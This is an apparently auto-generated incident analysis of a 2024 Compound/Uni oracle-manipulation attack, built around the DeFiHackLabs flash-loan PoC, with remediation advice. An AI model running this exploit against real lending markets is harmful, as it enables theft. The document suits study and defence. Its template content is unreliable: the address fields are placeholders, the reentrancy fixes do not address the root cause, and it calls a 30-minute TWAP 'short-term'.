# Compound/Uni — Uniswap V3 TWAP Oracle Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-02-12 |
| **Protocol** | Compound/Uni |
| **Chain** | Ethereum |
| **Loss** | Unconfirmed |
| **Attacker** | [0x](https://etherscan.io/address/0x) |
| **Attack Tx** | [0x](https://etherscan.io/tx/0x) |
| **Vulnerable Contract** | [0x](https://etherscan.io/address/0x) |
| **Root Cause** | Uniswap V3 TWAP Oracle Manipulation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/CompoundUni_exp.sol) |

---
## 1. Vulnerability Overview

Compound/Uni is a DeFi protocol operating on the Ethereum chain that suffered an **oracle / price manipulation** attack on 2024-02-12.
The attacker exploited Uniswap V3 TWAP oracle manipulation to cause approximately **unconfirmed** in damages.

### Key Vulnerability Summary
- **Classification**: Oracle / Price Manipulation
- **Impact**: Unconfirmed protocol asset loss
- **Attack Vector**: Oracle Manipulation

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Vulnerable implementation example
// Issue: Uniswap V3 TWAP oracle manipulation
// The attacker exploits this logic to obtain illegitimate profit

// Compound/Uni oracle manipulation interface — TWAP manipulation vulnerable function
interface IUniswapAnchoredView {
    // ❌ Vulnerable: When Uniswap V3 TWAP oracle is configured with a short period (e.g., 1 block),
    // mass swaps can rapidly manipulate the TWAP to inflate collateral value
    function getUnderlyingPrice(address cToken) external view returns (uint256);
}

interface IUNIV3Pool {
    // ❌ Vulnerable: A single large swap causes sudden tick/price change → short TWAP distortion
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes memory data
    ) external returns (int256 amount0, int256 amount1);
}

interface IcUniToken {
    // ❌ Vulnerable: Allows excessive borrowing based on manipulated oracle price
    function borrow(uint256 borrowAmount) external returns (uint256);
}

interface ICompoundcUSDC {
    function mint(uint256 mintAmount) external returns (uint256);
}

interface IComptroller {
    function enterMarkets(address[] memory cTokens) external returns (uint256[] memory);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
}

// ✅ Correct implementation: sufficiently long TWAP period + Chainlink dual validation
function safeGetPrice(address cToken) external view returns (uint256) {
    // ✅ Use minimum 30-minute (1800 second) TWAP — resistant to short-term manipulation
    uint256 twapPrice = IUniswapV3Oracle(oracle).getTWAP(cToken, 1800);
    // ✅ Verify deviation from Chainlink price is within 5%
    uint256 clPrice = IChainlinkFeed(feed).latestAnswer();
    require(
        abs(twapPrice - clPrice) * 100 / clPrice <= 5,
        "Oracle: TWAP/Chainlink deviation too high"
    );
    return twapPrice;
}
```

---
## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Flash Loan] ──── Liquidity Pool
  │
  ▼
[Oracle Price Manipulation] ─ Price Feed Contract
  │                              (TWAP/Spot Price Distortion)
  ▼
[Over-borrowing/Liquidation] ── Lending Protocol
  │
  ▼
[Repay & Secure Profit]
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - CompoundUni_exp.sol
// Chain: Ethereum | Date: 2024-02-12

    function testExploit() public {
        console.log("USDC balance:");
        emit log_named_decimal_uint("   [INFO] Before attack", USDC.balanceOf(address(this)), 6);

        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = address(USDC);
        amounts[0] = AMOUNT;
        vault.flashLoan(address(this), tokens, amounts, bytes(""));

        emit log_named_decimal_uint("   [INFO] After attack", USDC.balanceOf(address(this)), 6);
        console.log("When compound update the price, incomplete liquidation leading to bad debts");
    }

    function receiveFlashLoan(IERC20[] memory, uint256[] memory, uint256[] memory, bytes memory) public {
        // pledge the USDC
        USDC.approve(address(cUSDC), AMOUNT);
        cUSDC.mint(AMOUNT);
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(cUSDC);
        comptroller.enterMarkets(cTokens);

        // You should calculate the max u can borrow
        (, uint256 myTotalLiquidity,) = comptroller.getAccountLiquidity(address(this));

        // The max amount of UNI we can borrow = AccountLiquidity / UNI's price in compound
        uint256 max_UNI_borrow =
            myTotalLiquidity / UniswapAnchoredView.getUnderlyingPrice(address(cUniToken)) * 10 ** uni.decimals();
        cUniToken.borrow(max_UNI_borrow);

        // Swap: UNI => WETH => USDC, for the low Slippage
        UNI_WETH_Pool.swap(address(this), true, int256(uni.balanceOf(address(this))), 42_095_128_740, bytes(""));
        WETH_USDC_Pool.swap(
            address(this),
            false,
            int256(WETH.balanceOf(address(this))),
            1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341,
            bytes("")
        );

        USDC.transfer(msg.sender, AMOUNT); // pay back flashloan
    }

    uint256 public num = 0;

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) public {
        // For the twice swap()
        if (num == 0) {
            uni.transfer(msg.sender, uint256(amount0Delta));
            num++;
        } else {
            WETH.transfer(msg.sender, uint256(amount1Delta));
        }
    }
}

interface ICompoundcUSDC {
    function mint(
        uint256 mintAmount
    ) external returns (uint256);
```

> **Note**: The above code is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Criteria | Details |
|-----------|------|
| **DASP Top 10** | Oracle Manipulation |
| **Attack Type** | AMM Manipulation |
| **Vulnerability Category** | Economic Attack |
| **Attack Complexity** | Medium |
| **Preconditions** | Access to vulnerable function |
| **Impact Scope** | Partial assets |
| **Patchability** | High (resolvable via code fix) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Pause vulnerable functions**: Apply emergency pause to affected functions
2. **Assess damage**: Quantify lost assets and classify affected users
3. **Notify relevant parties**: Immediately notify related DEXes, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (use OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: update state
    balances[msg.sender] -= amount;
    // 3. Interactions: external calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Oracle manipulation prevention (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not rely solely on current spot price
}
```

### Long-term Improvements
- Conduct **independent security audits** (minimum 2 audit firms)
- Operate a **bug bounty program**
- Build a **monitoring system** (Forta, OpenZeppelin Defender, etc.)
- Implement an **emergency stop mechanism**

---
## 7. Lessons Learned

### For Developers
1. **Oracle / price manipulation attacks are preventable**: Defensible with proper validation and pattern application
2. **Consider economic incentives**: Design every function with the attacker's economic motivation in mind
3. **Audit priority**: Functions that directly handle assets are the top audit priority

### For Protocol Operators
1. **Real-time monitoring**: Establish immediate detection systems for abnormally large transactions
2. **Incident response plan**: Maintain a response playbook that can be executed immediately upon attack
3. **Insurance coverage**: Distribute risk through DeFi insurance protocols

### For the DeFi Ecosystem at Large
- The **2024-02-12** Compound/Uni incident reconfirms the danger of **oracle / price manipulation** attacks in the Ethereum ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Strengthening community-level security information sharing is recommended

---
*This document was written for educational and security research purposes. Do not misuse.*
*PoC original: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/CompoundUni_exp.sol)*